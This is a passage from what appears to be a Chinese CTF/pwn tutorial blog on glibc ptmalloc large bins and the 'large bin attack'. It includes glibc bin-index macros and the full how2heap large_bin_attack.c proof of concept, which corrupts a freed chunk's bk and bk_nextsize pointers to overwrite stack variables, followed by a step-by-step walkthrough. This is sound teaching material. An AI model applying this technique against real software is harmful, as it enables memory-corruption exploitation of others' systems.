+<p>一共有136个bin，fast bin是一个单独的数组，其中有10个bin，剩下的126个bin是另一个数组，这126个bin中序号1是unsorted bin，序号2到序号63是small bin，64到126是large bin，当chunk大于512Byte（64位下是1024Byte）</p>
+<p>那么large bin的这63个bin是如何组织的呢？</p>
+<table>
+<thead>
+<tr>
+<th>组</th>
+<th>数量</th>
+<th>公差</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>32</td>
+<td>64B</td>
+</tr>
+<tr>
+<td>2</td>
+<td>16</td>
+<td>512B</td>
+</tr>
+<tr>
+<td>3</td>
+<td>8</td>
+<td>4096B</td>
+</tr>
+<tr>
+<td>4</td>
+<td>4</td>
+<td>32768B</td>
+</tr>
+<tr>
+<td>5</td>
+<td>2</td>
+<td>262144B</td>
+</tr>
+<tr>
+<td>6</td>
+<td>1</td>
+<td>不限制</td>
+</tr>
+</tbody>
+</table>
+<p>这些bin分为6组，每一组中的bin的大小之间有一个固定的公差。以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)。</p>
+<p>一共有136个bin，为了知道这个放进large bin中的chunk放进这136个bin中的哪个bin，源码使用宏来计算：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define largebin_index_32(sz)                                                  \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38)                                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">         ? 56 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \
+</span></span></span><span class="line"><span class="cl"><span class="cp">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \
+</span></span></span><span class="line"><span class="cl"><span class="cp">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \
+</span></span></span><span class="line"><span class="cl"><span class="cp">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                 : 126)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define largebin_index_32_big(sz)                                              \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45)                                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">         ? 49 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \
+</span></span></span><span class="line"><span class="cl"><span class="cp">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \
+</span></span></span><span class="line"><span class="cl"><span class="cp">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \
+</span></span></span><span class="line"><span class="cl"><span class="cp">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                 : 126)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// XXX It remains to be seen whether it is good to keep the widths of
+</span></span></span><span class="line"><span class="cl"><span class="c1">// XXX the buckets the same or whether it should be scaled by a factor
+</span></span></span><span class="line"><span class="cl"><span class="c1">// XXX of two as well.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define largebin_index_64(sz)                                                  \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48)                                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">         ? 48 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \
+</span></span></span><span class="line"><span class="cl"><span class="cp">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \
+</span></span></span><span class="line"><span class="cl"><span class="cp">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \
+</span></span></span><span class="line"><span class="cl"><span class="cp">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                 : 126)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define largebin_index(sz)                                                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                                ? largebin_index_32_big(sz)    \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                                                : largebin_index_32(sz))
+</span></span></span></code></pre></div><p>如果我们先malloc六个堆块，实际大小为0x400，0x410，0x420，0x420，0x430，0x430，然后我们依次free可以得到下面这幅图：</p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220100711.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220100711.png" />
+        </a>
+    </p>
+<p>（图源自<a href="https://xz.aliyun.com/t/5177">浅析largebin attack - 先知社区</a>）</p>
+<p>其中我们看到，在large bin中我们使用了新的两个域fd_nextsize和bk_nextsize，他们在malloc_chunk结构体的位置如下：</p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220101526.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220101526.png" />
+        </a>
+    </p>
+<p>fd_nextsize用于指向同组的bins中下一个更小的bin，bk_nextsize用于指向同组的bins中下一个更大的bin。同时它是双向链表，所以两头的chunk会互相指向。</p>
+<p>下面内容来自<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_chunk">堆相关数据结构 - CTF Wiki</a></p>
+<ul>
+<li>fd，bk
+<ul>
+<li>chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下
+<ul>
+<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
+<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
+</ul>
+</li>
+<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
+</ul>
+</li>
+<li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。
+<ul>
+<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+</ul>
+</li>
+</ul>
+<p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列（也就是说，fd指向变小的方向）。这样做可以避免在寻找合适 chunk 时挨个遍历。</p>
+<h1 id="large-bin-attack基本原理概述">Large bin Attack基本原理概述</h1>
+<p>基本原理是，当chunk插入large bin中的时候，会改变原有chunk的fd、bk等，而如果我们在这几个域中填入我们自定义的数据，就可以改变某处的数据为此时插入chunk的指针值。</p>
+<p>有一点类似于unlink的原理，但是利用方法截然不同。large bin attack可以更改两个位置上的值为p3的指针，这个值往往挺大的，可以更改一些东西的阈限值，比如增大tcache的最大大小以使用tcache poison等。</p>
+<p>和unsorted bin attack一样可以打辅助，但是它更强的一点是我们可以知道填入的数据是一个什么样的值。</p>
+<h1 id="例子解释230以前">例子解释（2.30以前）</h1>
+<p>使用<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/large_bin_attack.c">how2heap/large_bin_attack.c at master · shellphish/how2heap · GitHub</a>作为例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    This technique is taken from
+</span></span></span><span class="line"><span class="cl"><span class="cm">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    [...]
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">              else
+</span></span></span><span class="line"><span class="cl"><span class="cm">              {
+</span></span></span><span class="line"><span class="cl"><span class="cm">                  victim-&gt;fd_nextsize = fwd;
+</span></span></span><span class="line"><span class="cl"><span class="cm">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+</span></span></span><span class="line"><span class="cl"><span class="cm">                  fwd-&gt;bk_nextsize = victim;
+</span></span></span><span class="line"><span class="cl"><span class="cm">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+</span></span></span><span class="line"><span class="cl"><span class="cm">              }
+</span></span></span><span class="line"><span class="cl"><span class="cm">              bck = fwd-&gt;bk;
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    [...]
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    mark_bin (av, victim_index);
+</span></span></span><span class="line"><span class="cl"><span class="cm">    victim-&gt;bk = bck;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    victim-&gt;fd = fwd;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    fwd-&gt;bk = victim;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    bck-&gt;fd = victim;
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    For more details on how large-bins are handled and sorted by ptmalloc,
+</span></span></span><span class="line"><span class="cl"><span class="cm">    please check the Background section in the aforementioned link.
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    [...]
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;This file demonstrates large bin attack by writing a large unsigned long value into stack</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34;global variable global_max_fast in libc for further fastbin attack</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Let&#39;s first look at the targets we want to rewrite on stack:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var1 (%p): %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="n">stack_var1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var2 (%p): %ld</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="n">stack_var2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Now, we allocate the first large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34; the first large chunk during the free()</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Then, we allocate the second large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34; the second large chunk during the free()</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Finally, we allocate the third large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34; the third large chunk during the free()</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;We free the first and second large chunks now and they will be inserted in the unsorted bin:&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34; [ %p &lt;--&gt; %p ]</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; [ %p ]</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Now, we free the third large chunk and it will be inserted in the unsorted bin:&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34; [ %p &lt;--&gt; %p ]</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p3</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1">//------------VULNERABILITY-----------
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s </span><span class="se">\&#34;</span><span class="s">size</span><span class="se">\&#34;</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; as well as its </span><span class="se">\&#34;</span><span class="s">bk</span><span class="se">\&#34;</span><span class="s"> and </span><span class="se">\&#34;</span><span class="s">bk_nextsize</span><span class="se">\&#34;</span><span class="s"> pointers</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; at the head of the large bin freelist. To overwrite the stack variables, we set </span><span class="se">\&#34;</span><span class="s">bk</span><span class="se">\&#34;</span><span class="s"> to 16 bytes before stack_var1 and&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; </span><span class="se">\&#34;</span><span class="s">bk_nextsize</span><span class="se">\&#34;</span><span class="s"> to 32 bytes before stack_var2</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3f1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var2</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34; During this time, targets should have already been rewritten:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var1 (%p): %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;stack_var2 (%p): %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// sanity check
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">assert</span><span class="p">(</span><span class="n">stack_var1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">assert</span><span class="p">(</span><span class="n">stack_var2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>在Ubuntu18下保存为test.c，使用命令<code>gcc -g test.c -otest</code>编译</p>
+<p>一开始我们初始化两个栈上变量，这也是我们等会需要修改的变量：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span></code></pre></div><p>然后我们分配三个大chunk并用小chunk隔开，第一个大chunk用来处理后续的分割请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+</span></span></code></pre></div><p>然后我们释放掉p1、p2，他们会先进入unsorted bin中。然后我们申请0x90的内存，这时候会把p2放进large bin中，将p1取出分割后放回unsorted bin中。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span></code></pre></div><p>这一步是为了让p2提前于p3进入large bin中，使用p1是为了防止分割p2导致其回到unsorted bin中。</p>
+<p>下一步我们就释放掉p3：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">free</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
+</span></span></code></pre></div><p>然后我们假设有这么一个漏洞，可以更改p2的size域、bk域、bk_nextsize域：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3f1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
